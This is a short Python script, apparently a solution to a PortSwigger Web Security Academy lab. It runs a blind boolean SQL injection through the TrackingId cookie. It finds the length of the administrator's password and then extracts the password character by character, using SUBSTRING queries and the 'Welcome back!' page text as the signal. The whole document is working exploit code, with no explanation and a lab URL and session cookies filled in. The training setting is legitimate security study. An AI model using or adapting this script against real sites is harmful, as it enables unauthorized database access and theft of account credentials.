import requests
url = 'https://0ae8007203c2280e81deac4000940075.web-security-academy.net/filter?category=Pets'

characters = 'abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_+=;:<>,./?'

def get_length():
    for i in range(1,101):
        cookie={"TrackingId":'rcAv09NfE7rxDLOK','session':'4Ve4UFLPKzCM30w2mDw1CJN0GytSrSmU'}
        payload=f"' AND LENGTH((SELECT password FROM users WHERE username='administrator'))= {i}--;"
        cookie['TrackingId']+=payload 
        r = requests.get(url,cookies=cookie)
        if "Welcome back!" in r.text:
            return i


def get_data(length):
    temp=""
    for i in range(1,length+1):
        for char in characters:
            cookie={"TrackingId":'rcAv09NfE7rxDLOK','session':'4Ve4UFLPKzCM30w2mDw1CJN0GytSrSmU'}
            payload=f"' AND SUBSTRING((SELECT password from users where username= 'administrator'),{i},1) = '{char}'--"
            cookie['TrackingId']+=payload 
            r = requests.get(url,cookies=cookie)
            if "Welcome back!" in r.text:
                print('\r'+temp)
                temp += char
                break
    return temp




# length = get_length()
# print(f"Password Length : {length}")

print("Dumping Data... Please be Patient.")
data = get_data(20)
print(f"Got it!: {data}")


